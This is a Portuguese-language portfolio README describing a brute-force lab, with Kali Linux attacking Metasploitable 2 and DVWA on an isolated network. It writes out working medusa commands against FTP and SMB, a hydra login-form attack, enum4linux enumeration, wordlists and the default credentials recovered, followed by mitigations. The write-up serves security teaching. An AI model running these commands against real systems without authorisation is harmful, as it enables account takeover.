# Projeto-Ciberseguran-a-DIO-Ataque-Brute-Force
Projeto que Simula Um Ataque de Força Bruta com Senhas em Ambiente Controlado Para Fins Didáticos.

 - Projeto montado de forma profissional, estruturado e pronto para portfólio — exatamente no padrão que recrutadores e equipes técnicas esperam ver.  Tudo está organizado por etapas e documentado em Arquivos Readme.

---

# 🔐 Projeto de Cibersegurança com Kali Linux + Medusa

## 📌 Descrição do Projeto

Este projeto tem como objetivo simular ataques de força bruta em um ambiente controlado, utilizando ferramentas de segurança ofensiva para compreender vulnerabilidades comuns e aplicar boas práticas de mitigação.

O laboratório foi construído com máquinas virtuais isoladas, garantindo segurança e controle durante os testes.

---

## 🧱 Ambiente de Laboratório

### 🔧 Estrutura Utilizada

* **Atacante:** Kali Linux
* **Alvo:** Metasploitable 2
* **Aplicação Web:** DVWA (Damn Vulnerable Web Application)
* **Ferramenta de Ataque:** Medusa
* **Virtualização:** VirtualBox
* **Rede:** Host-Only (rede interna isolada)

### 🌐 Configuração da Rede

* Ambas as VMs foram configuradas na mesma rede **Host-Only**
* Garantindo comunicação entre elas sem acesso externo
* Exemplo:

  * Kali Linux: `192.168.56.101`
  * Metasploitable: `192.168.56.102`

---

## 🚀 Cenários de Ataque

---

### 🔓 1. Ataque de Força Bruta em FTP

#### 📌 Objetivo

Testar autenticação fraca no serviço FTP.

#### 🧾 Wordlist utilizada

```bash
users.txt
admin
user
msfadmin

passwords.txt
123456
password
msfadmin
```

#### ⚙️ Comando com Medusa

```bash
medusa -h 192.168.56.102 -U users.txt -P passwords.txt -M ftp
```

#### ✅ Resultado

* Acesso obtido com:

  * Usuário: `msfadmin`
  * Senha: `msfadmin`

#### 🔎 Validação

```bash
ftp 192.168.56.102
```

---

### 🌐 2. Ataque em Formulário Web (DVWA)

#### 📌 Objetivo

Automatizar tentativas de login em aplicação web vulnerável.

#### ⚙️ Configuração DVWA

* Nível de segurança: **Low**
* URL:

```
http://192.168.56.102/dvwa/login.php
```

#### ⚙️ Exemplo de abordagem (conceitual)

Como o Medusa não é ideal para HTTP forms, pode-se utilizar ferramentas complementares como:

```bash
hydra -l admin -P passwords.txt 192.168.56.102 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

#### ✅ Resultado esperado

* Identificação de credenciais válidas
* Exemplo:

  * admin / password

#### 🔎 Observação

Esse tipo de ataque explora:

* Falta de proteção contra múltiplas tentativas
* Ausência de CAPTCHA
* Senhas fracas

---

### 🖥️ 3. Password Spraying em SMB

#### 📌 Objetivo

Testar múltiplos usuários com uma senha comum.

#### 🔍 Enumeração de usuários

```bash
enum4linux -U 192.168.56.102
```

#### 📄 Lista de usuários

```bash
users_smb.txt
msfadmin
user
guest
```

#### ⚙️ Ataque com Medusa

```bash
medusa -h 192.168.56.102 -U users_smb.txt -p password -M smbnt
```

#### ✅ Resultado

* Identificação de usuários com senha fraca/repetida

---

## 🛡️ Medidas de Mitigação

### 🔐 FTP

* Desabilitar autenticação por senha simples
* Implementar autenticação por chave (SSH)
* Bloqueio após tentativas falhas

---

### 🌐 Web (DVWA)

* Implementar CAPTCHA
* Limitar tentativas de login
* Uso de autenticação multifator (MFA)

---

### 🖥️ SMB

* Política de senhas fortes
* Bloqueio de contas após tentativas falhas
* Monitoramento de logs

---

## 🎯 Objetivos de Aprendizagem (Explicação Detalhada)

Durante a execução deste projeto, foram desenvolvidas competências práticas essenciais em cibersegurança:

### 🧠 1. Compreensão de Ataques de Força Bruta

Aprendizado de como ataques de força bruta funcionam na prática:

* No **FTP**, testando combinações de usuário e senha até encontrar acesso válido.
* No **DVWA**, simulando tentativas automatizadas em formulários web.
* No **SMB**, aplicando a técnica de *password spraying*, onde uma única senha é testada contra vários usuários.

Isso demonstra como sistemas com senhas fracas ou sem proteção pelo menos com certificação SSH são facilmente comprometidos.

---

### 🛠️ 2. Uso do Kali Linux e Medusa

Utilizei ferramentas reais do mercado:

* O Kali Linux como ambiente de testes
* O Medusa para automação de ataques de autenticação

Aprendi na prática:

* Uso de wordlists
* Execução de ataques direcionados por protocolo (FTP, SMB)
* Interpretação de resultados

---

### 🧾 3. Documentação Técnica

Estruturei todo o processo de forma clara:

* Defini o ambiente;
* Documentei os comandos;
* Registrei os resultados;
* Expliquei cada etapa.

Isso é essencial para:

* Auditorias de Cibersegurança;
* Comunicação técnica em equipes;
* Portfólio profissional.

---

### ⚠️ 4. Identificação de Vulnerabilidades

Durante os testes, identifiquei problemas clássicos:

* Senhas fracas;
* Falta de limitação de tentativas;
* Serviços expostos sem proteção adequada;

---

### 🛡️ 5. Aplicação de Mitigações

Mais importante que atacar, aprendi a defender:

* Implementação de políticas de senha fortes;
* Controle de acesso rigoroso;
* Proteções contra automação de ataques hackers.

---

### 💼 6. Uso do GitHub como Portfólio

Este projeto pode ser publicado como prova prática de conhecimento:

* Demonstra domínio técnico
* Mostra capacidade de documentação
* Evidencia raciocínio de segurança ofensiva e defensiva

---

## 📎 Conclusão do Projeto.

Este projeto demonstra, de forma prática, como vulnerabilidades simples podem ser exploradas e, principalmente, como podem ser mitigadas.

A abordagem prática em laboratório permite desenvolver habilidades reais de um profissional de cibersegurança, alinhando teoria e prática.

---

## ⚠️ Aviso Legal!

Este projeto foi realizado em ambiente controlado para fins educacionais e didáticos.
A execução dessas técnicas em ambientes reais sem autorização é ilegal e todas as linhas de códigos sem altorização é crime cibernético.

---



